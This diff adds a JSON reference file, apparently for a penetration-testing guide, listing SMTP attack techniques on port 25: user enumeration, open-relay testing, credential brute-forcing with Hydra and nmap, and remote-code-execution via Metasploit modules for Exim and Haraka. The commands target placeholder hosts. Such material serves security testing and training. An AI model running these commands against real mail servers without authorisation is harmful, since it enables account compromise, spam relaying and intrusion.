@@ -1,0 +1,136 @@
+{
+    "name": "SMTP - Email Server",
+    "port": 25,
+    "description": "Simple Mail Transfer Protocol for email transmission",
+    "icon": "📧",
+    "techniques": [
+        {
+            "id": "smtp-1",
+            "name": "User Enumeration",
+            "difficulty": "Beginner",
+            "description": "Enumerate valid email users through SMTP commands",
+            "steps": [
+                "Connect to SMTP server",
+                "Use VRFY or RCPT TO commands",
+                "Identify valid usernames"
+            ],
+            "commands": [
+                {
+                    "tool": "VRFY Command",
+                    "command": "VRFY admin",
+                    "description": "Verify if user exists"
+                },
+                {
+                    "tool": "RCPT TO",
+                    "command": "RCPT TO:admin@target.com",
+                    "description": "Check recipient validity"
+                },
+                {
+                    "tool": "smtp-user-enum",
+                    "command": "smtp-user-enum -M VRFY -U users.txt -t <target_ip>",
+                    "description": "Automated user enumeration"
+                },
+                {
+                    "tool": "Metasploit",
+                    "command": "use auxiliary/scanner/smtp/smtp_enum",
+                    "description": "MSF SMTP enumeration"
+                }
+            ],
+            "tips": [
+                "VRFY and EXPN often disabled",
+                "RCPT TO usually works for enumeration"
+            ]
+        },
+        {
+            "id": "smtp-2",
+            "name": "Open Relay Testing",
+            "difficulty": "Beginner",
+            "description": "Check if SMTP server allows unauthorized relay",
+            "steps": [
+                "Connect to SMTP server",
+                "Set sender and recipient",
+                "Attempt to send to external domain"
+            ],
+            "commands": [
+                {
+                    "tool": "Manual Test",
+                    "command": "MAIL FROM:<test@attacker.com>\\nRCPT TO:<victim@external.com>",
+                    "description": "Test open relay"
+                },
+                {
+                    "tool": "Nmap Script",
+                    "command": "nmap -p 25 --script smtp-open-relay <target_ip>",
+                    "description": "Check for open relay"
+                },
+                {
+                    "tool": "swaks",
+                    "command": "swaks --to victim@external.com --from test@attacker.com --server <target_ip>",
+                    "description": "Swiss Army Knife for SMTP"
+                }
+            ],
+            "tips": [
+                "Open relays can be used for spam/phishing",
+                "Many servers are misconfigured"
+            ]
+        },
+        {
+            "id": "smtp-3",
+            "name": "Brute Force Authentication",
+            "difficulty": "Intermediate",
+            "description": "Attack SMTP authentication credentials",
+            "steps": [
+                "Identify authentication methods",
+                "Prepare credentials list",
+                "Launch brute force"
+            ],
+            "commands": [
+                {
+                    "tool": "Hydra",
+                    "command": "hydra -l user@target.com -P passwords.txt smtp://<target_ip>",
+                    "description": "Brute force SMTP auth"
+                },
+                {
+                    "tool": "Nmap Script",
+                    "command": "nmap -p 25 --script smtp-brute <target_ip>",
+                    "description": "Nmap SMTP brute force"
+                }
+            ],
+            "tips": [
+                "Try common email formats: user, user@domain",
+                "Check for different auth mechanisms"
+            ]
+        },
+        {
+            "id": "smtp-4",
+            "name": "Command Execution Exploits",
+            "difficulty": "Advanced",
+            "description": "Exploit SMTP server vulnerabilities for RCE",
+            "steps": [
+                "Identify SMTP server version",
+                "Search for RCE exploits",
+                "Execute payload"
+            ],
+            "commands": [
+                {
+                    "tool": "Searchsploit",
+                    "command": "searchsploit exim postfix sendmail",
+                    "description": "Search for SMTP server exploits"
+                },
+                {
+                    "tool": "Metasploit Exim",
+                    "command": "use exploit/unix/smtp/exim4_string_format",
+                    "description": "Exim format string exploit"
+                },
+                {
+                    "tool": "Haraka RCE",
+                    "command": "use exploit/linux/smtp/haraka",
+                    "description": "Haraka SMTP RCE"
+                }
+            ],
+            "tips": [
+                "Check for Exim, Postfix, Sendmail versions",
+                "Many historical RCE vulnerabilities exist"
+            ]
+        }
+    ]
+}
